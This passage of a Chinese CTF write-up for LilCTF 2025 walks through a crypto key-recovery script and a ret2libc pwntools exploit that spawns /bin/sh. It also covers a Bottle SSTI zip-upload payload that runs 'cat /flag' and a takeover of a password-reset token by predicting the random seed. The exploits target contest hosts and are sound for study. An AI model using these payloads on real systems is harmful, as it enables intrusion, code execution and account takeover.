13902820281072641413],</span><br><span class="line">    [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707],</span><br><span class="line">]</span><br><span class="line">D = [</span><br><span class="line">    [1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044],</span><br><span class="line">    [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372],</span><br><span class="line">    [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427],</span><br><span class="line">    [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551],</span><br><span class="line">    [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395],</span><br><span class="line">]</span><br><span class="line">msg = b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span><br><span class="line"># -------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">def mat_eigs_modp(M_list, p):</span><br><span class="line">    &quot;&quot;&quot;Return eigenvalues of integer matrix modulo p (with multiplicity).&quot;&quot;&quot;</span><br><span class="line">    M = sp.Matrix([[x % p for x in row] for row in M_list])</span><br><span class="line">    lam = sp.symbols(&#x27;lam&#x27;)</span><br><span class="line">    # charpoly over ZZ then reduce mod p to avoid Mod-wrapping headaches</span><br><span class="line">    cpZZ = sp.Poly(M.charpoly(lam).as_expr(), lam, domain=&#x27;ZZ&#x27;)</span><br><span class="line">    coeffs = [int(c) % p for c in cpZZ.all_coeffs()]</span><br><span class="line">    poly_mod = sp.Poly(</span><br><span class="line">        sum(coeffs[i] * lam ** (len(coeffs) - 1 - i) for i in range(len(coeffs))),</span><br><span class="line">        lam, modulus=p</span><br><span class="line">    )</span><br><span class="line">    # factor over F_p</span><br><span class="line">    _, factors = poly_mod.factor_list()</span><br><span class="line">    eigs = []</span><br><span class="line">    for fac, mult in factors:</span><br><span class="line">        # fac is (lam - alpha) or lam + beta, all linear over F_p for our instance</span><br><span class="line">        if fac.degree() != 1:</span><br><span class="line">            # Fallback: numerically find roots over F_p (rare)</span><br><span class="line">            # Try brute over small deg - should not happen for 5x5 here</span><br><span class="line">            raise ValueError(&quot;Nonlinear factor appeared; adjust routine.&quot;)</span><br><span class="line">        # root of a*lam + b ≡ 0 =&gt; lam ≡ -b * a^&#123;-1&#125;</span><br><span class="line">        a = fac.all_coeffs()[0] % p</span><br><span class="line">        b = fac.all_coeffs()[1] % p</span><br><span class="line">        root = (-b * pow(a, -1, p)) % p</span><br><span class="line">        eigs.extend([root] * mult)</span><br><span class="line">    return eigs</span><br><span class="line"></span><br><span class="line">def crt(remainders, moduli):</span><br><span class="line">    &quot;&quot;&quot;Chinese remainder theorem, pairwise coprime moduli.&quot;&quot;&quot;</span><br><span class="line">    x, M = 0, 1</span><br><span class="line">    for (r, m) in zip(remainders, moduli):</span><br><span class="line">        # solve x ≡ r (mod m) and x ≡ x (mod M)</span><br><span class="line">        # -&gt; find t: M*t ≡ (r - x) (mod m)</span><br><span class="line">        t = ((r - x) * pow(M, -1, m)) % m</span><br><span class="line">        x += M * t</span><br><span class="line">        M *= m</span><br><span class="line">    return x % M, M</span><br><span class="line"></span><br><span class="line">def baby_step_giant_step(g, h, p, order):</span><br><span class="line">    &quot;&quot;&quot;Solve g^x = h in subgroup of order &#x27;order&#x27; ⊂ F_p^* using BSGS.&quot;&quot;&quot;</span><br><span class="line">    m = int(math.isqrt(order)) + 1</span><br><span class="line">    # baby steps: g^0..g^&#123;m-1&#125;</span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    e = 1</span><br><span class="line">    for j in range(m):</span><br><span class="line">        table.setdefault(e, j)</span><br><span class="line">        e = (e * g) % p</span><br><span class="line">    g_inv_m = pow(pow(g, m, p), -1, p)</span><br><span class="line">    gamma = h</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        if gamma in table:</span><br><span class="line">            return (i * m + table[gamma]) % order</span><br><span class="line">        gamma = (gamma * g_inv_m) % p</span><br><span class="line">    raise ValueError(&quot;log not found (inconsistent inputs)&quot;)</span><br><span class="line"></span><br><span class="line">def discrete_log_pohlig_hellman(g, h, p):</span><br><span class="line">    &quot;&quot;&quot;Return x s.t. g^x = h mod p, using PH over factors of p-1.&quot;&quot;&quot;</span><br><span class="line">    n = p - 1</span><br><span class="line">    # factorization of n (64-bit here; sympy is fine). If too slow for you, replace with Pollard-Rho.</span><br><span class="line">    fac = sp.factorint(n)  # &#123;q: e&#125;</span><br><span class="line">    residues = []</span><br><span class="line">    moduli = []</span><br><span class="line">    for q, e in fac.items():</span><br><span class="line">        q_pow = q ** e</span><br><span class="line">        # Work in subgroup of order q_pow</span><br><span class="line">        # Set g1 = g^&#123;n/q_pow&#125;, h1 = h^&#123;n/q_pow&#125;</span><br><span class="line">        g1 = pow(g, n // q_pow, p)</span><br><span class="line">        h1 = pow(h, n // q_pow, p)</span><br><span class="line">        # Solve for x modulo q_pow by lifting (standard PH lifting)</span><br><span class="line">        x_qe = 0</span><br><span class="line">        g_inv = pow(g1, -1, p)</span><br><span class="line">        for k in range(e):</span><br><span class="line">            # Compute c_k = h1 * (g1^&#123;-x_qe&#125;)^&#123;1&#125;  then raise to (q^&#123;e-1-k&#125;)</span><br><span class="line">            c = (h1 * pow(g_inv, x_qe, p)) % p</span><br><span class="line">            # exponent to collapse to order q</span><br><span class="line">            exp = pow(q, e - 1 - k)</span><br><span class="line">            c_k = pow(c, exp, p)</span><br><span class="line">            g_k = pow(g1, exp, p)</span><br><span class="line">            d = baby_step_giant_step(g_k, c_k, p, q)  # in subgroup of order q</span><br><span class="line">            x_qe = x_qe + d * pow(q, k)</span><br><span class="line">        residues.append(x_qe)</span><br><span class="line">        moduli.append(q_pow)</span><br><span class="line">    x, _ = crt(residues, moduli)</span><br><span class="line">    return x % n</span><br><span class="line"></span><br><span class="line">def recover_key_from_eigs(p, eigC, eigD):</span><br><span class="line">    &quot;&quot;&quot;Try all pairings; return the consistent key (mod p-1).&quot;&quot;&quot;</span><br><span class="line">    nonzeroC = [x for x in eigC if x % p != 0]</span><br><span class="line">    nonzeroD = [x for x in eigD if x % p != 0]</span><br><span class="line">    candidates = []</span><br><span class="line">    for lam in nonzeroC:</span><br><span class="line">        for mu in nonzeroD:</span><br><span class="line">            # same subgroup check</span><br><span class="line">            if mu == 1 and lam == 1:</span><br><span class="line">                candidates.append(0)</span><br><span class="line">                continue</span><br><span class="line">            try:</span><br><span class="line">                k = discrete_log_pohlig_hellman(lam % p, mu % p, p)</span><br><span class="line">            except Exception:</span><br><span class="line">                continue</span><br><span class="line">            candidates.append(k)</span><br><span class="line">    if not candidates:</span><br><span class="line">        raise RuntimeError(&quot;No candidate keys found.&quot;)</span><br><span class="line">    # pick the most frequent k (they应当一致)</span><br><span class="line">    k, _ = Counter(candidates).most_common(1)[0]</span><br><span class="line">    return k</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    eigC = mat_eigs_modp(C, p)</span><br><span class="line">    eigD = mat_eigs_modp(D, p)</span><br><span class="line">    # print(&quot;eigC =&quot;, eigC)</span><br><span class="line">    # print(&quot;eigD =&quot;, eigD)</span><br><span class="line"></span><br><span class="line">    key_mod = recover_key_from_eigs(p, eigC, eigD)</span><br><span class="line">    # key is in [2^62, p), 但我们只需要与 p-1 同余，即用于 AES 不影响（原题直接 pad(long_to_bytes(key),16)）</span><br><span class="line">    key_bytes = long_to_bytes(key_mod)</span><br><span class="line">    # pad 至 16 的倍数与出题脚本一致</span><br><span class="line">    padlen = (16 - (len(key_bytes) % 16)) % 16</span><br><span class="line">    if padlen:</span><br><span class="line">        key_bytes = key_bytes + b&quot;\x00&quot; * padlen</span><br><span class="line"></span><br><span class="line">    aes = AES.new(key_bytes, AES.MODE_ECB)</span><br><span class="line">    pt = aes.decrypt(msg)</span><br><span class="line">    # 原题对 flag 做了 pad(flag, 64)</span><br><span class="line">    try:</span><br><span class="line">        flag = unpad(pt, 64)</span><br><span class="line">    except ValueError:</span><br><span class="line">        # 如果出题脚本用了固定 blocksize=64 的 pad，这里尝试手动剥离</span><br><span class="line">        # 简单兜底：去掉末尾整块的 PKCS#7（若失败就直接打印原文）</span><br><span class="line">        try:</span><br><span class="line">            flag = unpad(pt, 16)</span><br><span class="line">        except ValueError:</span><br><span class="line">            flag = pt</span><br><span class="line"></span><br><span class="line">    print(&quot;[+] key (mod p-1) =&quot;, key_mod)</span><br><span class="line">    print(&quot;[+] AES key bytes (padded) =&quot;, key_bytes)</span><br><span class="line">    print(&quot;[+] flag =&quot;, flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后再用这个脚本，套上上面的key就好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"># 修正：正确用 PKCS#7 pad(key_bytes, 16) 作为 AES key</span><br><span class="line">import math</span><br><span class="line">from collections import Counter</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from Crypto.Util.Padding import unpad, pad</span><br><span class="line">import sympy as sp</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">p = 14668080038311483271</span><br><span class="line"># 省略 C, D, msg 定义（与你之前的一样）</span><br><span class="line">C = [</span><br><span class="line">    [11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212],</span><br><span class="line">    [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914],</span><br><span class="line">    [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670],</span><br><span class="line">    [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413],</span><br><span class="line">    [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707],</span><br><span class="line">]</span><br><span class="line">D = [</span><br><span class="line">    [1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044],</span><br><span class="line">    [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372],</span><br><span class="line">    [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427],</span><br><span class="line">    [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551],</span><br><span class="line">    [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395],</span><br><span class="line">]</span><br><span class="line">msg = b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span><br><span class="line"></span><br><span class="line"># （省略前面求特征值、PH、BSGS 的函数 —— 和之前脚本一致）</span><br><span class="line"># 你可以继续沿用之前的 mat_eigs_modp()、discrete_log_pohlig_hellman()、recover_key() 等函数</span><br><span class="line"># 假设我们已得到了 key_mod（即之前你打印出来的 5273966641785501202）</span><br><span class="line"></span><br><span class="line">key_mod = 5273966641785501202  # 由你先前输出得到</span><br><span class="line"></span><br><span class="line">def try_keys_and_decrypt(key_candidate_int):</span><br><span class="line">    # 出题脚本用 pad(long_to_bytes(key), 16) 作为 AES key</span><br><span class="line">    kb = long_to_bytes(key_candidate_int)</span><br><span class="line">    aes_key = pad(kb, 16)  # &lt;-- 关键改动：用 PKCS#7 填充到 16 字节边界</span><br><span class="line">    aes = AES.new(aes_key, AES.MODE_ECB)</span><br><span class="line">    pt = aes.decrypt(msg)</span><br><span class="line">    # 题里对 flag 做了 pad(flag, 64) —— 所以这里用 blocksize=64 去 unpad</span><br><span class="line">    try:</span><br><span class="line">        plain = unpad(pt, 64)</span><br><span class="line">        return plain</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"># 直接试 key_mod（通常就是正确的，因为 key 原本在 [2**62, p)）</span><br><span class="line">res = try_keys_and_decrypt(key_mod)</span><br><span class="line">if res:</span><br><span class="line">    print(&quot;[+] success with key_mod -&gt;&quot;, res)</span><br><span class="line">else:</span><br><span class="line">    # 如果不成功，尝试 key_mod + t*(p-1) 在允许范围内的候选（理论上 key &lt; p）</span><br><span class="line">    found = None</span><br><span class="line">    step = p - 1</span><br><span class="line">    # 只需要尝试很少几个 t，因原 key 位于 [2**62, p)</span><br><span class="line">    for t in range(0, 3):</span><br><span class="line">        candidate = key_mod + t * step</span><br><span class="line">        if candidate &gt;= 2**62 and candidate &lt; p:</span><br><span class="line">            res = try_keys_and_decrypt(candidate)</span><br><span class="line">            if res:</span><br><span class="line">                found = (candidate, res)</span><br><span class="line">                break</span><br><span class="line">    if found:</span><br><span class="line">        print(&quot;[+] found by adding multiple of (p-1):&quot;, found)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] decrypt failed for tested candidates. 可能需要检查 key 恢复步骤。&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这时候就有屏幕前的家人问了，主播主播，你为什么不把两个脚本合并起来呢，因为我也不知道为什么合并起来就 MemoryError 了，于是只能作罢，反正题做出来了</p>
<p>LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>打ret2libc，通过拼接 puts_plt(puts_got) 打印出puts函数的真实地址，泄露 libc 库的偏移量。 然后通过给定的 libc 库，计算出出目标的 system 地址和 “&#x2F;bin&#x2F;sh” 地址， 最后拼接 systme(“&#x2F;bin&#x2F;sh”) 完成 getshell</p>
<p>理论是这样的，但是作为一个根本没学过 pwn 的菜鸡来说，还是太吃操作了，所以就不贴我的错误 exp 了，找了个大佬的 exp 来，说实话比我写的简洁多了，不愧是大佬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">port = remote(&quot;challenge.xinshi.fun&quot;,41148)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">main = 0x401178</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000401176</span><br><span class="line"></span><br><span class="line">ret  = 0x000000000040101a</span><br><span class="line"></span><br><span class="line">success(&quot;puts_plt ==&gt; &quot; + hex(puts_plt) + &#x27;\n&#x27; + &quot;pust_got ==&gt;&quot; + hex(puts_got) )</span><br><span class="line"></span><br><span class="line">payload_test = b&#x27;a&#x27;*0x70 + b&#x27;a&#x27;*0x8 + p64(ret) +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">port.sendafter(b&quot;What&#x27;s your name?&quot;, payload_test)</span><br><span class="line"></span><br><span class="line">address = u64(port.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">success(&quot;address ==&gt; &quot; + hex(address))</span><br><span class="line"></span><br><span class="line">base = address - libc.symbols[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line">success(&quot;base ==&gt;&quot; + hex(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">sh_str = base + libc.search(&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line"></span><br><span class="line">success(&quot;system ==&gt; &quot; + hex(system) + &#x27;\n&#x27; + &quot;sh_str ==&gt;&quot; + hex(sh_str) )</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x70 + b&#x27;a&#x27;*0x8  +p64(pop_rdi) + p64(sh_str) + p64(system) + p64(main)</span><br><span class="line"></span><br><span class="line">port.send(payload)</span><br><span class="line"></span><br><span class="line">port.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-bottle"><a href="#ez-bottle" class="headerlink" title="ez_bottle"></a>ez_bottle</h3><p>bottle 居然不是 LamentXU 大佬来出还是有点出乎意料的</p>
<p>python SSTI，过滤很阴，但是没有过滤 % </p>
<p>return template(content) 模板会渲染解压后的内容</p>
<p>不知道为什么没有回显，可以走 static 出回显</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import zipfile</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">fcontent = f&quot;%import sys;sys.modules[&#x27;ciallo&#x27;]=sys.modules[&#x27;\\x6fs&#x27;];import ciallo;ciallo.system(&#x27;cat /flag \\x3e static/a.txt&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">zfio = io.BytesIO()</span><br><span class="line">zf = zipfile.ZipFile(zfio, &#x27;w&#x27;)</span><br><span class="line">zf.writestr(&#x27;ciallo.txt&#x27;, fcontent)</span><br><span class="line">zf.close()</span><br><span class="line"></span><br><span class="line">TARGET=&quot;http://challenge.xinshi.fun:41479&quot;</span><br><span class="line"></span><br><span class="line"># 上传 zip</span><br><span class="line">resp = requests.post(f&quot;&#123;TARGET&#125;/upload&quot;, files=&#123;&#x27;file&#x27;: (&#x27;ciallo.zip&#x27;, zfio.getvalue())&#125;)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line"># 访问 txt 文件</span><br><span class="line">visit_path = resp.text.splitlines()[1][4:]</span><br><span class="line">resp = requests.get(f&quot;&#123;TARGET&#125;&#123;visit_path&#125;&quot;)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line"># 读取 flag</span><br><span class="line">resp = requests.get(f&quot;&#123;TARGET&#125;/static/a.txt&quot;)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>

<h3 id="Ekko-note"><a href="#Ekko-note" class="headerlink" title="Ekko note"></a>Ekko note</h3><p>比赛之前有翻过 LamentXU 大佬的文章，有一篇就是 uuid8，根据这个我们可以知道这道题的版本是 3.13+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。</span><br><span class="line"># 反正整个程序没有一个地方用到random库。应该没有什么问题。</span><br><span class="line">import random</span><br><span class="line">random.seed(SERVER_START_TIME)</span><br></pre></td></tr></table></figure>
<p>源码中给两段这个那就肯定要利用这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/server_info&#x27;)</span><br><span class="line">@login_required</span><br><span class="line">def server_info():</span><br><span class="line">    return &#123;</span><br><span class="line">        &#x27;server_start_time&#x27;: SERVER_START_TIME,</span><br><span class="line">        &#x27;current_time&#x27;: time.time()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if user:</span><br><span class="line">    # 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span><br><span class="line">    # UUID v8吧，看起来版本比较新</span><br><span class="line">    token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧</span><br><span class="line">    reset_token = PasswordResetToken(user_id=user.id, token=token)</span><br><span class="line">    db.session.add(reset_token)</span><br><span class="line">    db.session.commit()</span><br></pre></td></tr></table></figure>

<p>token 值可获取，就是个 random 伪随机</p>
<p>这里我们用 3.13.5 的环境去执行获取 token 的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">random.seed(1755241270.5513663)</span><br><span class="line"></span><br><span class="line">def padding(input_string):</span><br><span class="line">    byte_string = input_string.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    if len(byte_string) &gt; 6: byte_string = byte_string[:6]</span><br><span class="line">    padded_byte_string = byte_string.ljust(6, b&#x27;\x00&#x27;)</span><br><span class="line">    padded_int = int.from_bytes(padded_byte_string, byteorder=&#x27;big&#x27;)</span><br><span class="line">    return padded_int</span><br><span class="line"></span><br><span class="line">token = str(uuid.uuid8(a=padding(&quot;admin&quot;)))</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">61646d69-6e00-8483-8219-c921bd0a5eb8</span><br></pre></td></tr></table></figure>
<p>重置 admin 的密码，然后登录进去，进入管理员界面会显示 2066 年后才能用，那我们直接改个timeapi，在2066年之后就好</p>
<p>监听静态⽂件</p>
<p>python3 -m http.server 20000</p>
<p>修改timeapi服务器为 <a target="_blank" rel="noopener" href="http://test.xxxx.com:20000/time.json">http://test.xxxx.com:20000/time.json</a></p>
<p>然后执⾏命令cat flag</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io">ALe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io/2025/08/15/LilCTF2025-wp/">https://ale1293528.github.io/2025/08/15/LilCTF2025-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/mygo4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img class="cover" src="/img/mygo5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Python Bottle SSTI</div></div><div class="info-2"><div class="info-item-1">XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了  Bottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。 主要特点   特点 说明    单文件 框架代码就是一个 bottle.py 文件，方便直接打包或拷贝   零依赖 除了 Python 标准库外不需要额外安装其它库   内置开发服务器 用 run() 就能启动 HTTP 服务   支持多模板引擎 默认内置 SimpleTemplate，也支持 Jinja2、Mako 等   路由简洁 使用装饰器 @route() 定义 URL 对应的处理函数   WSGI兼容 可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署   内置常用工具 请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等   基本结构示例1234567from bottle...</div></div></div></a><a class="pagination-related" href="/2025/08/09/XYCTF2025-wp/" title="XYCTF2025-wp"><img class="cover" src="/img/anon.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">XYCTF2025-wp</div></div><div class="info-2"><div class="info-item-1">比赛是之前打的，但是一直没有复盘，暑假闲来无事故决定复盘一下，也是作为复习 WEBfate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string):    if len(binary_string) % 8 != 0:        raise ValueError(&quot;Binary string length must be a multiple of 8&quot...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/22/2025%E5%B9%B4%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-wp/" title="2025年江苏省第七届大学生网络安全知识技能大赛-wp"><img class="cover" src="/img/mygo1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">2025年江苏省第七届大学生网络安全知识技能大赛-wp</div></div><div class="info-2"><div class="info-item-1">遗憾差一点点没进决赛， 